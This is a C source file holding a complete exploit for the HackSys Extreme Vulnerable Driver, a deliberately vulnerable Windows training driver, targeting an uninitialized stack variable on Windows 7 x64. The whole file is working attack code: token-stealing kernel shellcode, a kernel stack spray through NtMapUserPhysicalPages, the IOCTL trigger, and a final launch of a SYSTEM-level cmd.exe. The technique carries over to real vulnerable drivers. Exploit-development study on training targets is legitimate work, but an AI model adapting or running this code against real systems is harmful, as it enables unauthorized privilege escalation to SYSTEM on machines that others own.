// Exploit    : HackSys Extreme Vulnerable Driver - Uninitialized Stack Variable 
// Author     : Hashim Jawad - @ihack4falafel
// OS         : Windows 7 Enterprise (x64) SP1

#include <stdio.h>
#include <windows.h>

int main() {

	wchar_t* deviceName = L"\\\\.\\HackSysExtremeVulnerableDriver";        // make sure the character set is set to Unicode under project defaults
	const DWORD iocontrolCode = 0x22202F;                                  // found using Ghidra
	DWORD outputBuffer = 0;
	DWORD bytesReturned = 0;
	BOOL ioResult;

	// Token stealing shellcode
	BYTE shellCode[] = {
		//0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,     // breakpoint
		//0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,     // nop cushion 
		0x48, 0x31, 0xC0,                                     // xor rax, rax                     ; zero out rax
		0x65, 0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,       // mov rax,QWORD PTR gs:[rax+0x188] ; move current thread (KTHREAD) into rax (KPCR + 0x180(KPRCB) + 0x8(KTHREAD))
		0x48, 0x8B, 0x40, 0x70,                               // mov rax,QWORD PTR [rax+0x70]     ; move current EPROCESS to rax (KTHREAD + 0x50(KAPC_STATE) + 0x20(EPROCESS))
		0x48, 0x89, 0xC1,                                     // mov rcx, rax                     ; make copy of the current process's EPROCESS
		0x49, 0x89, 0xCB,                                     // mov r11,rcx                      ; store RefCnt from token (EX_FAST_REF) structure
		0x49, 0x83, 0xE3, 0x07,                               // and r11,0x7
		0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00,             // mov rdx,0x4                      ; move SYSTEM PID to rdx
		0x48, 0x8B, 0x80, 0x88, 0x01, 0x00, 0x00,             // mov rax,QWORD PTR [rax+0x188]    ; fetch ActiveProcessLinks doubly-linked list (EPROCESS+0x188)
		0x48, 0x2D, 0x88, 0x01, 0x00, 0x00,                   // sub rax, 0x188                   ; loop thru the list processes and extract UniqueProcessId (EPROCESS+0x180)
		0x48, 0x39, 0x90, 0x80, 0x01, 0x00, 0x00,             // cmp QWORD PTR [rax+0x180],rdx    ; until you find SYSTEM PID of 4
		0x75, 0xEA,                                           // jne $-0x14+(0x2)
		0x48, 0x8B, 0x90, 0x08, 0x02, 0x00, 0x00,             // mov rdx,QWORD PTR [rax+0x208]    ; grab SYSTEM's process EPROCESS token
		0x48, 0x83, 0xE2, 0xF0,                               // and rdx, 0x0fffffffffffffff0
		0x4C, 0x09, 0xDA,                                     // or rdx,r11
		0x48, 0x89, 0x91, 0x08, 0x02, 0x00, 0x00,             // mov QWORD PTR [rcx+0x208],rdx    ; replace the current EPROCESS's token
		0x48, 0x31, 0xC0,                                     // xor rax, rax                     ; simulate NTSTATUS SUCCESS! 
		//0x48, 0x83, 0xC4, 0x28,                               // add rsp, 0x28                    ; recover Kernel stuff
		0xC3,                                                 // ret
	};

	// Create driver handle
	HANDLE hevdDriver = CreateFile(deviceName,             // lpFileName
		GENERIC_READ | GENERIC_WRITE,                  // dwDesiredAccess
		FILE_SHARE_READ | FILE_SHARE_WRITE,            // dwShareMode
		NULL,                                          // lpSecurityAttributes
		OPEN_EXISTING,                                 // dwCreationDisposition
		FILE_ATTRIBUTE_NORMAL,                         // dwFlagsAndAttributes
		NULL                                           // hTemplateFile
	);
	
	if (hevdDriver == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to grab device handle with error code: %u\n", GetLastError());
		exit(-1);
	}

	printf("[+] Driver handle snatched at: %p\n", hevdDriver);

	// Allocate memory for shellcode
	LPVOID shellcodeAddress = VirtualAlloc(NULL,            // lpAddress
		sizeof(shellCode),                              // dwSize
		MEM_COMMIT | MEM_RESERVE,                       // flAllocationType
		PAGE_EXECUTE_READWRITE                          // flProtect
	);

	if (!shellcodeAddress) {
		printf("[!] Failed to allocate memory for shellcode with error code: %u\n", GetLastError());
		exit(-1);
	}

	printf("[+] Shellcode memory has been allocated at: 0x%p\n", shellcodeAddress);

	// Copy token stealing shellcode to user space memory
	memcpy(shellcodeAddress,                                // Dst
		shellCode,                                      // Src
		sizeof(shellCode)                               // size of Src
	);

	printf("[+] Copying shellcode to RWX allocated memory\n");

	printf("[+] Spraying kernel stack with shellcode pointer...\n");
	BYTE buffer[8192] = { 0 }; // 1024 * IntPtr::Size (8 on 64-bit => 8192 bytes)
	for (unsigned int i = 0; i < 8192; i += 8)
		//*(PULONG64)(buffer + i) = (ULONG64)0x4141414141414141;
		*(PULONG64)(buffer + i) = (ULONG64)shellcodeAddress;

	// Use the undocumented NtMapUserPhysicalPages function to spray the kernel stack and ultimately overwrite the uninitialized stack variable (callback) with a shellcode pointer 
	// reference https://j00ru.vexillium.org/2011/05/windows-kernel-stack-spraying-techniques/
	typedef NTSTATUS(NTAPI *_NtMapUserPhysicalPages)(
		PVOID VirtualAddress,
		ULONG_PTR NumberOfPages,
		PULONG_PTR UserPfnArray
		);

	_NtMapUserPhysicalPages NtMapUserPhysicalPages = (_NtMapUserPhysicalPages)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtMapUserPhysicalPages");
	NtMapUserPhysicalPages(NULL, 1024, (PULONG_PTR)buffer);

	// Set dummy buffer as an input for DeviceIoControl
	char exploit[1024];
	memset(exploit, 'A', sizeof(exploit));

	ioResult = DeviceIoControl(hevdDriver,                  // hDevice
		iocontrolCode,					// dwIoControlCode
		exploit,					// lpInBuffer
		sizeof(exploit),				// nInBufferSize
		&outputBuffer,                                  // lpOutBuffer
		0,                                              // nOutBufferSize
		&bytesReturned,                                 // lpBytesReturned
		NULL                                            // lpOverlapped
	);
	
	if (ioResult == FALSE) {
		printf("[!] Failed to call target driver with error code: %u\n", GetLastError());
		exit(-1);
	}

	printf("[+] Device call was successful\n");

	// Spawn new cmd.exe as NT AUTHORITY\SYSTEM
	printf("[+] Enjoy your new SYSTEM shell!\n");
	system("cmd.exe");

	// Cleanup code
	if (hevdDriver != INVALID_HANDLE_VALUE) {
		CloseHandle(hevdDriver);
	}
	
	return 0;
}
